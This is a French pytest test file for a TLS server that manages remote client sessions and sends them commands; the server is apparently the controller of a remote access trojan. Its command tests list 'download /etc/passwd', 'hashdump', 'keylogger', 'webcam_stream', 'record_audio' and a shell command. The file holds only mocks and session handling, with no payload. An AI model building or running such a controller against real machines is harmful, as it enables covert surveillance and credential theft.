"""Tests unitaires pour le module server/utils/server.py."""

import ssl
import socket
import threading

import pytest
from unittest.mock import MagicMock, patch, call


# ---------------------------------------------------------------------------
# Classe simplifiée TLSServer pour tests isolés
# ---------------------------------------------------------------------------


class TLSServer:
    """Version allégée pour tests (même logique, sans imports circulaires)."""

    def __init__(self, host: str, port: int, certfile: str, keyfile: str) -> None:
        self.host = host
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile

        self.sock = None
        self.running = False

        self.sessions = {}
        self.addresses = {}
        self.next_id = 1
        self.current_session = None
        self.lock = threading.Lock()

    def _create_context(self, certfile, keyfile):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
        return ctx

    def _remove_session(self, sid):
        with self.lock:
            sock = self.sessions.pop(sid, None)
            self.addresses.pop(sid, None)
            if self.current_session == sid:
                self.current_session = next(iter(self.sessions), None)
        if sock:
            try:
                sock.close()
            except OSError:
                pass

    def _send_to_current(self, data):
        with self.lock:
            sid = self.current_session
            sock = self.sessions.get(sid)
        if not sock:
            return
        try:
            sock.sendall(data + b"\n")
        except OSError:
            self._remove_session(sid)

    def stop(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
        with self.lock:
            sids = list(self.sessions.keys())
        for sid in sids:
            self._remove_session(sid)


# ===================================================================
# Tests initialisation
# ===================================================================


class TestServerInit:
    """Tests d'initialisation du serveur."""

    def test_init_attributes(self):
        """Vérification des attributs après initialisation."""
        srv = TLSServer("0.0.0.0", 4443, "cert.pem", "key.pem")
        assert srv.host == "0.0.0.0"
        assert srv.port == 4443
        assert srv.certfile == "cert.pem"
        assert srv.keyfile == "key.pem"
        assert srv.sock is None
        assert srv.running is False

    def test_init_empty_sessions(self):
        """Aucune session à l'initialisation."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        assert srv.sessions == {}
        assert srv.addresses == {}
        assert srv.next_id == 1
        assert srv.current_session is None

    def test_init_has_lock(self):
        """Un threading.Lock est présent."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        assert isinstance(srv.lock, type(threading.Lock()))


# ===================================================================
# Tests gestion des sessions
# ===================================================================


class TestSessionManagement:
    """Tests de gestion des sessions (ajout, suppression, sélection)."""

    def _make_server_with_sessions(self, n=3):
        """Crée un serveur avec `n` sessions mock."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        for i in range(1, n + 1):
            srv.sessions[i] = MagicMock()
            srv.addresses[i] = (f"192.168.1.{i}", 50000 + i)
        srv.next_id = n + 1
        srv.current_session = 1
        return srv

    def test_add_session(self):
        """Ajout d'une session."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        mock_sock = MagicMock()

        with srv.lock:
            sid = srv.next_id
            srv.next_id += 1
            srv.sessions[sid] = mock_sock
            srv.addresses[sid] = ("10.0.0.1", 5000)
            if srv.current_session is None:
                srv.current_session = sid

        assert 1 in srv.sessions
        assert srv.current_session == 1

    def test_add_multiple_sessions(self):
        """Ajout de plusieurs sessions."""
        srv = self._make_server_with_sessions(3)
        assert len(srv.sessions) == 3
        assert srv.next_id == 4

    def test_remove_session(self):
        """Suppression d'une session."""
        srv = self._make_server_with_sessions(3)
        mock_sock = srv.sessions[2]

        srv._remove_session(2)

        assert 2 not in srv.sessions
        assert 2 not in srv.addresses
        mock_sock.close.assert_called_once()

    def test_remove_current_session_switches(self):
        """Supprimer la session courante bascule sur une autre."""
        srv = self._make_server_with_sessions(3)
        srv.current_session = 1

        srv._remove_session(1)

        # current_session doit pointer vers une session restante
        assert srv.current_session in srv.sessions

    def test_remove_last_session(self):
        """Supprimer la dernière session → current_session = None."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        srv.sessions[1] = MagicMock()
        srv.addresses[1] = ("10.0.0.1", 5000)
        srv.current_session = 1

        srv._remove_session(1)

        assert srv.current_session is None
        assert len(srv.sessions) == 0

    def test_remove_nonexistent_session(self):
        """Supprimer une session inexistante ne plante pas."""
        srv = self._make_server_with_sessions(2)
        srv._remove_session(999)  # ne doit pas lever d'exception

    def test_remove_session_oserror(self):
        """OSError sur sock.close() est gérée silencieusement."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        mock_sock = MagicMock()
        mock_sock.close.side_effect = OSError("Already closed")
        srv.sessions[1] = mock_sock
        srv.addresses[1] = ("10.0.0.1", 5000)
        srv.current_session = 1

        srv._remove_session(1)  # ne doit pas lever d'exception
        assert 1 not in srv.sessions


# ===================================================================
# Tests envoi de commandes
# ===================================================================


class TestSendToCurrentSession:
    """Tests pour _send_to_current."""

    def test_send_to_current_basic(self):
        """Envoi d'une commande à la session courante."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        mock_sock = MagicMock()
        srv.sessions[1] = mock_sock
        srv.current_session = 1

        srv._send_to_current(b"ipconfig")

        mock_sock.sendall.assert_called_once_with(b"ipconfig\n")

    def test_send_to_current_adds_newline(self):
        """Un \\n est ajouté automatiquement."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        mock_sock = MagicMock()
        srv.sessions[1] = mock_sock
        srv.current_session = 1

        srv._send_to_current(b"screenshot")

        sent = mock_sock.sendall.call_args[0][0]
        assert sent.endswith(b"\n")

    def test_send_no_session(self):
        """Aucune session sélectionnée → rien n'est envoyé."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        srv.current_session = None

        srv._send_to_current(b"test")
        # Pas de crash, pas d'envoi

    def test_send_oserror_removes_session(self):
        """OSError sur sendall → session supprimée."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        mock_sock = MagicMock()
        mock_sock.sendall.side_effect = OSError("Broken pipe")
        srv.sessions[1] = mock_sock
        srv.addresses[1] = ("10.0.0.1", 5000)
        srv.current_session = 1

        srv._send_to_current(b"test")

        assert 1 not in srv.sessions

    def test_send_various_commands(self):
        """Différentes commandes sont envoyées correctement."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        mock_sock = MagicMock()
        srv.sessions[1] = mock_sock
        srv.current_session = 1

        commands = [
            b"download /etc/passwd",
            b"shell 4444",
            b"keylogger 30",
            b"webcam_stream 10",
            b"record_audio 5",
            b"hashdump",
            b"search config.ini",
        ]

        for cmd in commands:
            mock_sock.reset_mock()
            srv._send_to_current(cmd)
            mock_sock.sendall.assert_called_once_with(cmd + b"\n")


# ===================================================================
# Tests stop
# ===================================================================


class TestServerStop:
    """Tests pour la méthode stop."""

    def test_stop_sets_running_false(self):
        """stop() met running à False."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        srv.running = True
        srv.stop()
        assert srv.running is False

    def test_stop_closes_server_socket(self):
        """stop() ferme la socket serveur."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        srv.sock = MagicMock()
        srv.running = True

        srv.stop()

        srv.sock.close.assert_called_once()

    def test_stop_closes_all_sessions(self):
        """stop() ferme toutes les sessions actives."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        mocks = {}
        for i in range(1, 4):
            m = MagicMock()
            srv.sessions[i] = m
            srv.addresses[i] = (f"10.0.0.{i}", 5000 + i)
            mocks[i] = m
        srv.current_session = 1
        srv.running = True

        srv.stop()

        for m in mocks.values():
            m.close.assert_called_once()
        assert len(srv.sessions) == 0

    def test_stop_without_socket(self):
        """stop() sans socket serveur ne plante pas."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        srv.sock = None
        srv.stop()

    def test_stop_idempotent(self):
        """Appeler stop() deux fois ne plante pas."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        srv.sock = MagicMock()
        srv.running = True

        srv.stop()
        srv.stop()


# ===================================================================
# Tests parsing protocole entrant
# ===================================================================


class TestHandleIncomingData:
    """Tests du parsing des données entrantes côté serveur."""

    def test_parse_send_file(self):
        """Détection de l'opération SEND_FILE."""
        operation = "SEND_FILE screenshot.png"
        assert operation.startswith("SEND_FILE ")
        filename = operation.split()[1]
        assert filename == "screenshot.png"

    def test_parse_display(self):
        """Détection de l'opération DISPLAY."""
        operation = "DISPLAY"
        assert operation == "DISPLAY"

    def test_parse_frame(self):
        """Détection de l'opération FRAME."""
        operation = "FRAME"
        assert operation == "FRAME"

    def test_parse_stream_end(self):
        """Détection de l'opération STREAM_END."""
        operation = "STREAM_END"
        assert operation == "STREAM_END"

    def test_parse_unknown_operation(self):
        """Opération inconnue → pas de crash."""
        operation = "UNKNOWN_OP data"
        assert not operation.startswith("SEND_FILE ")
        assert operation != "DISPLAY"
        assert operation != "FRAME"
        assert operation != "STREAM_END"


# ===================================================================
# Tests thread-safety des sessions
# ===================================================================


class TestThreadSafety:
    """Tests de concurrence sur la gestion des sessions."""

    def test_concurrent_session_add(self):
        """Ajout concurrent de sessions."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        errors = []

        def add_session(idx):
            try:
                with srv.lock:
                    sid = srv.next_id
                    srv.next_id += 1
                    srv.sessions[sid] = MagicMock()
                    srv.addresses[sid] = (f"10.0.0.{idx}", 5000)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=add_session, args=(i,)) for i in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(errors) == 0
        assert len(srv.sessions) == 20

    def test_concurrent_session_remove(self):
        """Suppression concurrente de sessions."""
        srv = TLSServer("0.0.0.0", 4443, "c", "k")
        for i in range(1, 21):
            srv.sessions[i] = MagicMock()
            srv.addresses[i] = (f"10.0.0.{i}", 5000)
        srv.current_session = 1
        srv.next_id = 21

        errors = []

        def remove_session(sid):
            try:
                srv._remove_session(sid)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=remove_session, args=(i,)) for i in range(1, 21)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(errors) == 0
        assert len(srv.sessions) == 0
